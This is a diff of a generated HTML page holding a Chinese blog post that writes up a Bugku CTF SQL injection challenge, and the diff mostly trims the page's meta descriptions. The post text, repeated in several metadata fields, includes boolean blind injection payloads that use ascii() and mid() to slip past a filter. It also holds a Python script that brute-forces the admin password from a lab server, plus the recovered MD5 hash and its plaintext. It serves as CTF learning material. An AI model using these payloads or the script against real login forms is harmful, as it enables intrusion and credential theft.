@@ -5,31 +5,7 @@
 <meta name=robots content="index, follow">
 <title>Bugku-SQL注入-WriteUP | Console.makeHappy(_1ming)</title>
 <meta name=keywords content="CTF,WriteUP,Note">
-<meta name=description content="题目网址：sql注入
-一个很正经的界面，有实战那味了。
-上来先尝试经典组合：
-admin~password
-很幸运，用户名猜中了。
-利用单引号检测是否存在SQL注入
-admin' or 1 = 1
-报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
-'or<>(不等号)#()空格可用括号代替，等号可用相反的不等号
-先尝试是否存在布尔注入：
-成功，用户名存在注入~
-之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
-select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
-1'or((ascii(mid((select(password)from(admin))from(1))))<>9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
-我们尝试下集束炸弹，让两个参数都作为目标
-第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
-爆破成功了。。。
-接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
-4dcc88f8f1bc05e7c2ad1a60288481a2
-去md5破解站破解一下，成功解出密码：
-bugkuctf
-结束了……
-反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
-贴一组大神的python自动脚本，以供学习
-#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = &#34;admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#&#34; % (i, ord(j)) #屏蔽了&#34;,&#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #<>表示不等号 #^表示异或 payload2= &#34;admin123'or((ascii(mid((select(password)from(admin))from(%s))))<>%s)#&#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= &#34;admin123'or((ascii(mid((select(database()))from(%s))))<>%s)#&#34;%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests.">
+<meta name=description content="题目网址：sql注入 一个很正经的界面，有实战那味了。 上来先尝试经典组合： admin~password 很幸运，用户名猜中了。 利用单引号检测是否存在SQL注入 admin' or 1 = 1 报">
 <meta name=author content="Yiming Shen">
 <link rel=canonical href=https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/>
 <meta name=google-site-verification content="XYZabc">
@@ -50,31 +26,7 @@ bugkuctf
 <script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-123-45','auto'),ga('send','pageview'))</script>
 <script async src=https://www.google-analytics.com/analytics.js></script>
 <meta property="og:title" content="Bugku-SQL注入-WriteUP">
-<meta property="og:description" content="题目网址：sql注入
-一个很正经的界面，有实战那味了。
-上来先尝试经典组合：
-admin~password
-很幸运，用户名猜中了。
-利用单引号检测是否存在SQL注入
-admin' or 1 = 1
-报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
-'or<>(不等号)#()空格可用括号代替，等号可用相反的不等号
-先尝试是否存在布尔注入：
-成功，用户名存在注入~
-之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
-select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
-1'or((ascii(mid((select(password)from(admin))from(1))))<>9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
-我们尝试下集束炸弹，让两个参数都作为目标
-第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
-爆破成功了。。。
-接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
-4dcc88f8f1bc05e7c2ad1a60288481a2
-去md5破解站破解一下，成功解出密码：
-bugkuctf
-结束了……
-反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
-贴一组大神的python自动脚本，以供学习
-#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = &#34;admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#&#34; % (i, ord(j)) #屏蔽了&#34;,&#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #<>表示不等号 #^表示异或 payload2= &#34;admin123'or((ascii(mid((select(password)from(admin))from(%s))))<>%s)#&#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= &#34;admin123'or((ascii(mid((select(database()))from(%s))))<>%s)#&#34;%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests.">
+<meta property="og:description" content="题目网址：sql注入 一个很正经的界面，有实战那味了。 上来先尝试经典组合： admin~password 很幸运，用户名猜中了。 利用单引号检测是否存在SQL注入 admin' or 1 = 1 报">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/"><meta property="og:image" content="https://shenyiming.life/android-chrome-512x512.png"><meta property="article:section" content="post">
 <meta property="article:published_time" content="2021-10-24T00:00:00+00:00">
@@ -82,33 +34,9 @@ bugkuctf
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://shenyiming.life/android-chrome-512x512.png">
 <meta name=twitter:title content="Bugku-SQL注入-WriteUP">
-<meta name=twitter:description content="题目网址：sql注入
-一个很正经的界面，有实战那味了。
-上来先尝试经典组合：
-admin~password
-很幸运，用户名猜中了。
-利用单引号检测是否存在SQL注入
-admin' or 1 = 1
-报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
-'or<>(不等号)#()空格可用括号代替，等号可用相反的不等号
-先尝试是否存在布尔注入：
-成功，用户名存在注入~
-之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
-select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
-1'or((ascii(mid((select(password)from(admin))from(1))))<>9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
-我们尝试下集束炸弹，让两个参数都作为目标
-第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
-爆破成功了。。。
-接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
-4dcc88f8f1bc05e7c2ad1a60288481a2
-去md5破解站破解一下，成功解出密码：
-bugkuctf
-结束了……
-反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
-贴一组大神的python自动脚本，以供学习
-#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = &#34;admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#&#34; % (i, ord(j)) #屏蔽了&#34;,&#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #<>表示不等号 #^表示异或 payload2= &#34;admin123'or((ascii(mid((select(password)from(admin))from(%s))))<>%s)#&#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= &#34;admin123'or((ascii(mid((select(database()))from(%s))))<>%s)#&#34;%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests.">
+<meta name=twitter:description content="题目网址：sql注入 一个很正经的界面，有实战那味了。 上来先尝试经典组合： admin~password 很幸运，用户名猜中了。 利用单引号检测是否存在SQL注入 admin' or 1 = 1 报">
 <script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"文章","item":"https://shenyiming.life/post/"},{"@type":"ListItem","position":3,"name":"Bugku-SQL注入-WriteUP","item":"https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/"}]}</script>
-<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bugku-SQL注入-WriteUP","name":"Bugku-SQL注入-WriteUP","description":"题目网址：sql注入\n一个很正经的界面，有实战那味了。\n上来先尝试经典组合：\nadmin~password\n很幸运，用户名猜中了。\n利用单引号检测是否存在SQL注入\nadmin' or 1 = 1\n报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：\n'\ror\r\u0026lt;\u0026gt;(不等号)\r#\r()\r空格可用括号代替，等号可用相反的不等号\n先尝试是否存在布尔注入：\n成功，用户名存在注入~\n之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）\nselect password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload\n1\u0026#39;or((ascii(mid((select(password)from(admin))from(1))))\u0026lt;\u0026gt;9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难\n我们尝试下集束炸弹，让两个参数都作为目标\n第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码\n爆破成功了。。。\n接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：\n4dcc88f8f1bc05e7c2ad1a60288481a2\n去md5破解站破解一下，成功解出密码：\nbugkuctf\n结束了……\n反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。\n贴一组大神的python自动脚本，以供学习\n#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = \u0026#39;http://114.67.246.176:19665/\u0026#39; sss = string.digits + (string.ascii_lowercase) a = \u0026#39;\u0026#39; for i in range(1, 50): flag = 0 for j in sss: payload = \u0026#34;admin\u0026#39;^((ascii(mid((select(password)from(admin))from(%s))))\u0026lt;\u0026gt;%s)^1#\u0026#34; % (i, ord(j)) #屏蔽了\u0026#34;,\u0026#34;，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #\u0026lt;\u0026gt;表示不等号 #^表示异或 payload2= \u0026#34;admin123\u0026#39;or((ascii(mid((select(password)from(admin))from(%s))))\u0026lt;\u0026gt;%s)#\u0026#34;%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= \u0026#34;admin123\u0026#39;or((ascii(mid((select(database()))from(%s))))\u0026lt;\u0026gt;%s)#\u0026#34;%(i,ord(j)) data = {\u0026#39;username\u0026#39;: payload, \u0026#39;password\u0026#39;: \u0026#39;admin\u0026#39;} res = requests.","keywords":["CTF","WriteUP","Note"],"articleBody":"题目网址：sql注入\n一个很正经的界面，有实战那味了。\n上来先尝试经典组合：\nadmin~password\n很幸运，用户名猜中了。\n利用单引号检测是否存在SQL注入\nadmin' or 1 = 1\n报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：\n'\ror\r(不等号)\r#\r()\r空格可用括号代替，等号可用相反的不等号\n先尝试是否存在布尔注入：\n成功，用户名存在注入~\n之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）\nselect password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload\n1'or((ascii(mid((select(password)from(admin))from(1))))9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难\n我们尝试下集束炸弹，让两个参数都作为目标\n第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码\n爆破成功了。。。\n接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：\n4dcc88f8f1bc05e7c2ad1a60288481a2\n去md5破解站破解一下，成功解出密码：\nbugkuctf\n结束了……\n反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。\n贴一组大神的python自动脚本，以供学习\n#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = \"admin'^((ascii(mid((select(password)from(admin))from(%s))))%s)^1#\" % (i, ord(j)) #屏蔽了\",\"，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #表示不等号 #^表示异或 payload2= \"admin123'or((ascii(mid((select(password)from(admin))from(%s))))%s)#\"%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= \"admin123'or((ascii(mid((select(database()))from(%s))))%s)#\"%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests.post(url, data=data).text if 'username does not exist!' in res: a += j flag = 1 print(a) break if flag == 0: break print(a) 参考题解 [1] Bugku_sqli write up\n","wordCount":"118","inLanguage":"en","datePublished":"2021-10-24T00:00:00Z","dateModified":"2021-10-24T00:00:00Z","author":{"@type":"Person","name":"Yiming Shen"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/"},"publisher":{"@type":"Organization","name":"Console.makeHappy(_1ming)","logo":{"@type":"ImageObject","url":"https://shenyiming.life/favicon.ico"}}}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bugku-SQL注入-WriteUP","name":"Bugku-SQL注入-WriteUP","description":"题目网址：sql注入 一个很正经的界面，有实战那味了。 上来先尝试经典组合： admin~password 很幸运，用户名猜中了。 利用单引号检测是否存在SQL注入 admin' or 1 = 1 报","keywords":["CTF","WriteUP","Note"],"articleBody":"题目网址：sql注入\n一个很正经的界面，有实战那味了。\n上来先尝试经典组合：\nadmin~password\n很幸运，用户名猜中了。\n利用单引号检测是否存在SQL注入\nadmin' or 1 = 1\n报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：\n'\ror\r(不等号)\r#\r()\r空格可用括号代替，等号可用相反的不等号\n先尝试是否存在布尔注入：\n成功，用户名存在注入~\n之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）\nselect password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload\n1'or((ascii(mid((select(password)from(admin))from(1))))9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难\n我们尝试下集束炸弹，让两个参数都作为目标\n第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码\n爆破成功了。。。\n接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：\n4dcc88f8f1bc05e7c2ad1a60288481a2\n去md5破解站破解一下，成功解出密码：\nbugkuctf\n结束了……\n反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。\n贴一组大神的python自动脚本，以供学习\n#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = \"admin'^((ascii(mid((select(password)from(admin))from(%s))))%s)^1#\" % (i, ord(j)) #屏蔽了\",\"，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #表示不等号 #^表示异或 payload2= \"admin123'or((ascii(mid((select(password)from(admin))from(%s))))%s)#\"%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= \"admin123'or((ascii(mid((select(database()))from(%s))))%s)#\"%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests.post(url, data=data).text if 'username does not exist!' in res: a += j flag = 1 print(a) break if flag == 0: break print(a) 参考题解 [1] Bugku_sqli write up\n","wordCount":"762","inLanguage":"en","datePublished":"2021-10-24T00:00:00Z","dateModified":"2021-10-24T00:00:00Z","author":{"@type":"Person","name":"Yiming Shen"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://shenyiming.life/post/15.bugku-sql%E6%B3%A8%E5%85%A5/"},"publisher":{"@type":"Organization","name":"Console.makeHappy(_1ming)","logo":{"@type":"ImageObject","url":"https://shenyiming.life/favicon.ico"}}}</script>
 </head>
 <body id=top>
 <script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
@@ -176,7 +104,7 @@ bugkuctf
 Bugku-SQL注入-WriteUP
 </h1>
 <div class=post-meta>
-October 24, 2021&nbsp;·&nbsp;October 24, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+October 24, 2021&nbsp;·&nbsp;October 24, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
 |&nbsp;<a href=https://github.com/shenyimings/shenyimings.github.io/tree/main/docs rel="noopener noreferrer" target=_blank>Issue</a>
 </div>
 </header>
